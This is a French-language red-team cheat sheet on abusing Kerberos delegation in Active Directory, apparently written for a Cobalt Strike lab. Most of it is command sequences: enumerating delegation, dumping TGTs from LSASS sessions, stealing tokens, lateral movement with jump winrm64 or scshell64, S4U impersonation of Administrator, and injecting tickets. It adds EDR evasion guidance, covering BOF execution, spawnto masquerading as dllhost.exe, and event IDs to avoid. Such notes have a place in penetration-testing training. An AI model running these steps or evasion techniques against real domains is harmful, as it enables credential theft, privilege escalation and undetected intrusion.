# Cheatsheet — Kerberos

* Unconstrained Delegation
* Constrained Delegation
* Service Name Substitution
* S4U2self — Compromission d'un compte machine
* Resource-Based Constrained Delegation
* Lateral Movement Services

---

## Unconstrained Delegation

> Énumération :  

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```  

> Rubeus monitor — capture du TGT :  

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```  

> Récupérer le token utilisateur depuis la machine compromise avec le menu Cobalt Strike :

> Ouvrir Cobalt Strike > clic droit sur le Beacon > Explorer > Process List > trier les processus > sélectionner le token de l'utilisateur > Steal Token.  

> Effectuer le jump vers la cible en Unconstrained Delegation, dans l'ordre indiqué :

```
# OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write
jump winrm64 lon-ws-1 smb

# OPSEC-CAUTION (fallback) — SCShell, modifies existing service ImagePath via SCM
# Generates: Event 7040 (service config changed), 4697, 4688, SCM RPC events
# Use only if WinRM is unavailable or blocked
jump scshell64 lon-ws-1 smb
```

> Interagir ensuite avec le nouveau Beacon du Web Server.

---

### Fork & Run — Pourquoi le limiter et quelles alternatives utiliser

**Fonctionnement de fork & run :**
Les commandes post-exploitation de Cobalt Strike (`execute-assembly`, `powerpick`, `mimikatz`, etc.) peuvent créer un child process temporaire (`spawnto`), injecter une DLL reflective, exécuter le payload puis fermer le processus.

**Pourquoi l'EDR peut détecter cette activité :**
- Un Beacon parent (`dllhost.exe`) qui lance `rundll32.exe` sans argument produit un parent–child process inhabituel.
- Une mémoire `RWX` dans le processus enfant, sans image disque associée, peut signaler une injection en mémoire.
- Les hooks EDR sur `NtCreateProcess`, `VirtualAllocEx` ou `CreateRemoteThread` peuvent observer les opérations fork & run.

**Modèle privilégié — BOF (`inline-execute`) :**
- Exécute du code C position-independent directement dans le thread du Beacon.
- Pas de nouveau child process ni d'injection cross-process dans un autre processus.
- Pas d'événement de création parent–child propre à ce modèle d'exécution.

| Commande | Modèle d'exécution | Nouveau processus | Risque EDR |
|---------|----------------|---------------|----------|
| `inline-execute` / BOF | Dans le thread Beacon | Aucun | Faible |
| `krb_triage` / `krb_dump` | BOF | Aucun | Faible |
| `execute-assembly` | Fork & run → spawnto | Oui | Moyen (selon spawnto) |
| `powerpick` | Fork & run → spawnto | Oui | Moyen |
| `shell` / `run` / `powershell` | Crée un child process cmd/powershell | Oui | Élevé — éviter |

**Réduire les artefacts de fork & run si nécessaire :**
Configurer `spawnto` dans le Malleable C2 Profile pour désigner un processus hôte signé approprié :
```
post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }
```
Ou directement au niveau du Beacon :
```
spawnto x64 %windir%\sysnative\dllhost.exe
```
Cela change le processus lancé, mais ne supprime pas la télémétrie d'injection. Les BOF restent privilégiés dans ces notes.

---

> Récupérer le ticket de l'utilisateur `dyork` sur le Web Server, avec un BOF plutôt que fork & run :

```
krb_triage

krb_dump /luid:148e2b /service:krbtgt
```

> `OPSEC-CAUTION` — `krb_dump` utilise `LsaCallAuthenticationPackage` (API Kerberos). Il ne lit pas directement la mémoire LSASS, mais un EDR peut observer cet appel API. Avec BOF, aucun child process n'est créé.

> Injecter directement le ticket, sans écriture sur disque :

```
make_token CONTOSO\dyork FakePass!
kerberos_ticket_use <base64-ticket>
```

> `OPSEC-SAFE` — `kerberos_ticket_use` injecte en mémoire le ticket dans la session de logon du Beacon, sans fichier sur disque ni child process.

Le lab illustre l'obtention d'un accès administrateur au Web Server via Unconstrained Delegation et l'utilisation du token d'un compte administrateur local.  

----

## Exécution de commandes distantes — Réduire la détection AV/EDR

À utiliser pour obtenir des résultats de reconnaissance depuis un Beacon en limitant les alertes liées à la création de processus.

### Niveau 1 — OPSEC-SAFE : BOF dans le thread Beacon

```
inline-execute sysinfo.o
```

Aucun lancement de `systeminfo.exe` ni de child process : l'exécution reste dans le thread Beacon. Préféré lorsqu'un BOF sysinfo est chargé sur le team server.

---

### Niveau 2 — OPSEC-CAUTION : `powerpick` et WMI (fork & run)

Collecte les mêmes données que `systeminfo` sans exécuter son binaire. Fonctionne avec fork & run dans le processus `spawnto`, configuré ici sur `dllhost.exe`.

```
powerpick Get-WmiObject Win32_OperatingSystem | Select Caption,Version,OSArchitecture,CSName
powerpick Get-WmiObject Win32_ComputerSystem | Select Domain,TotalPhysicalMemory,Manufacturer,Model
powerpick Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select IPAddress,DefaultIPGateway,DNSServerSearchOrder
```

---

### Niveau 3 — OPSEC-CAUTION : `run` (CreateProcess direct)

```
run systeminfo
```

Lance `systeminfo.exe` directement via `CreateProcess`, sans passer par `cmd.exe`. Ce binaire de reconnaissance possède des signatures comportementales connues : privilégier les niveaux 1 ou 2.

---

### Méthodes à éviter

```
shell systeminfo      ← OPSEC-UNSAFE: beacon → cmd.exe → systeminfo.exe
powershell systeminfo ← OPSEC-UNSAFE: spawns powershell.exe
```

| Méthode | Binaire lancé | Child process | Risque EDR |
|--------|---------------|---------------|----------|
| `inline-execute sysinfo.o` | Aucun | Aucun | Faible |
| `powerpick` + WMI | spawnto (`dllhost.exe`) | Oui | Moyen |
| `run systeminfo` | `systeminfo.exe` | Oui | Moyen à élevé |
| `shell systeminfo` | `cmd.exe` + `systeminfo.exe` | Oui | Élevé — éviter |

----  

## Constrained Delegation

La **Constrained Delegation** limite les services back-end auxquels un principal peut déléguer l'authentification. Contrairement à l'Unconstrained Delegation, le TGT de l'utilisateur n'est pas transféré. Le service utilise deux extensions Kerberos :

- **S4U2self** — le service demande un ticket pour *lui-même* au nom d'un utilisateur, sans son TGT ni son mot de passe.
- **S4U2proxy** — le service utilise ce ticket pour demander un ticket destiné au service back-end autorisé (`msDS-AllowedToDelegateTo`).

Lorsque **`TRUSTED_TO_AUTH_FOR_DELEGATION`** est actif (Protocol Transition), le service peut effectuer une impersonation d'autres utilisateurs, y compris Domain Admin, auprès du service délégué. Dans ce scénario, l'accès à la machine déléguante et à son TGT permet d'accéder au service back-end sous une identité privilégiée.

---

### Enumeration

Une seule requête LDAP permet de récupérer le compte délégant, les services autorisés et le flag UAC :

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

> `OPSEC-SAFE` — BOF, runs in beacon thread, no child process.

Décoder la valeur `userAccountControl` pour vérifier la présence de `TRUSTED_TO_AUTH_FOR_DELEGATION`.  
Exécuter cette commande sur le client Cobalt Strike de l'Attacker Desktop (PowerShell local, pas via le Beacon) :

```powershell
# Replace 16781312 with the actual userAccountControl value returned above
[Convert]::ToBoolean(16781312 -band 16777216)
# True = protocol transition enabled
```

⚠️ `16781312` = `WORKSTATION_TRUST_ACCOUNT (0x1000)` + `TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)`. Si le résultat est `True`, le scénario S4U2self est possible.

---

### Exploitation

#### Étape 1 — Lateral Movement vers l'hôte délégant (`lon-ws-1`)

⚠️ Voir les étapes de [Lateral Movement et User Impersonation](/labs/User-Impersonation-lab.md).

#### Étape 2 — Récupérer le TGT du compte machine via BOF

Le LUID `0x3e7` correspond à la session de logon du compte machine sur un hôte joint au domaine :

```
krb_dump /luid:3e7 /service:krbtgt
```

> `OPSEC-CAUTION` — BOF (no child process). Utilise l'API Kerberos `LsaCallAuthenticationPackage`, potentiellement surveillée par l'EDR, sans lecture directe de LSASS.

#### Étape 3 — Obtenir un service ticket par S4U avec un BOF

```
krb_s4u /ticket:[base64-TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

> `OPSEC-SAFE` — `krb_s4u` est un BOF exécuté dans le thread Beacon, sans nouveau processus ni écriture sur disque. Les notes le privilégient à `execute-assembly Rubeus.exe s4u`, qui utilise fork & run.

Vérifier éventuellement le ticket obtenu :

```
krb_describe /ticket:[base64-service-ticket]
```

> `OPSEC-SAFE` — BOF, lecture seule du ticket.

#### Étape 4 — Injecter le service ticket et accéder à la cible

Les étapes se déroulent depuis le client Cobalt Strike et le Beacon ; le fichier `.kirbi` reste sur l'Attacker Desktop, sans écriture sur la cible :

```
make_token CONTOSO\Administrator FakePass!
```

Sur le client Cobalt Strike (PowerShell local) :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64_SERVICE_TICKET]"))
```

De retour dans le Beacon :

```
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$
```

> `OPSEC-SAFE` — `kerberos_ticket_use` injecte le ticket en mémoire dans la session de logon du Beacon. Le chemin du fichier correspond à l'Attacker Desktop, pas à la cible.

Terminer l'impersonation après utilisation :

```
rev2self
```

---

### ⚠️ À éviter — S4U avec Fork & Run

```
execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap
```

> `OPSEC-CAUTION` — fork & run crée un processus temporaire `spawnto`. Privilégier le BOF `krb_s4u` ; utiliser cette alternative uniquement si le BOF n'est pas disponible sur le team server.

## 
